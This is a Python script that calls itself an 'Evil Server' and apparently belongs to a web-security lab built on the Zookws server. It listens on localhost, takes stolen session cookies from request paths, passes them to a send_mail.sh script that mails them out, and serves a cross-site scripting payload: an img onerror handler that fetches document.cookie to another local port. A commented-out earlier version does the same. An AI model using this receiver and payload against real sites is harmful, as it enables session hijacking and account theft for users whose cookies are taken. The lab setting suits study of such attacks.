#!/usr/bin/env python3

import os
import subprocess
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

send_mail = "/home/kali/CLionProjects/Zookws/send_mail.sh"
last_cookie = None
eval_html_example = \
    '''
    <div class='code'>
        <span class='tagnamecolor'>
        <span class='tagcolor'><</span>img
        <span class='attributecolor'>
        src
        <span class='attributevaluecolor'>=\"https://static.wikia.nocookie.net/iannielli-legend/images/6/6e/Cookie_monster.jpg\"</span> 
        width
        <span class='attributevaluecolor'>=\"300\"</span> 
        <span class='tagcolor'>></span>
        <br>
        &nbsp;&nbsp;
        <span class='tagnamecolor'>
        <span class='tagcolor'><</span>img
        <span class='attributecolor'>
        src
        <span class='attributevaluecolor'>=\"bla\"</span> 
        width
        <span class='attributevaluecolor'>=\"0\"</span> 
        height
        <span class='attributevaluecolor'>=\"0\"</span> 
        onerror
        <span class='attributevaluecolor'>=\"fetch(`http://localhost:8081/?cookie=${document.cookie}`)\"</span> 
        <span class='tagcolor'>/></span>
        </span>
        </span>
        <br>
        <span class='tagnamecolor'>
        <span class='tagcolor'><</span>
        <span class='tagcolor'>/</span>img<span class='tagcolor'>></span>
        </span>
    </div>
    '''

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global last_cookie
        path = urlparse(self.path).path
        cookie = os.path.basename(path).replace('cookie/', '')
        if not cookie or cookie == 'favicon.ico' or cookie == last_cookie:
            return
        else:
            last_cookie = cookie
        try:
            output = subprocess.check_output(['sh', send_mail, cookie])
            print(f'Output: {output}')
            # self.send_response(200)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(eval_html_example.encode('utf-8'))
        except subprocess.CalledProcessError as e:
            print(f'Error: {e}')


def main():
    host = 'localhost'
    port = 3000
    server = HTTPServer((host, port), RequestHandler)
    print(f'Evil Server listening on {host}:{port}')
    server.serve_forever()


if __name__ == '__main__':
    main()

# #!/usr/bin/env python3
#
# import subprocess
# from http.server import BaseHTTPRequestHandler, HTTPServer
# from urllib.parse import urlparse, parse_qs
#
# send_mail = "/home/kali/CLionProjects/Zookws/send_mail.sh"
#
#
# class RequestHandler(BaseHTTPRequestHandler):
#     def do_GET(self):
#         stolen_cookie = self.get_cookie_from_path()
#         print(f'Got cookie: {stolen_cookie}')
#         if not stolen_cookie:
#             self.send_response(400)
#             self.end_headers()
#             self.wfile.write(b'Missing filename parameter')
#             return
#
#         try:
#             output = subprocess.check_output(['sh', send_mail, stolen_cookie])
#             print(f'Output: {output}')
#             self.send_response(200)
#             self.end_headers()
#             self.wfile.write(output)
#         except subprocess.CalledProcessError:
#             self.send_response(500)
#             self.end_headers()
#             self.wfile.write(b'Error running script')
#
#     def get_cookie_from_path(self):
#         path = urlparse(self.path).path
#         if path.startswith('/'):
#             path = path[1:]
#         stolen_cookie = parse_qs(urlparse(self.path).query).get('cookie', [None])[0]
#         return stolen_cookie
#
#
# def main():
#     host = 'localhost'
#     port = 3000
#     server = HTTPServer((host, port), RequestHandler)
#     print(f'Server listening on {host}:{port}')
#     server.serve_forever()
#
#
# if __name__ == '__main__':
#     main()
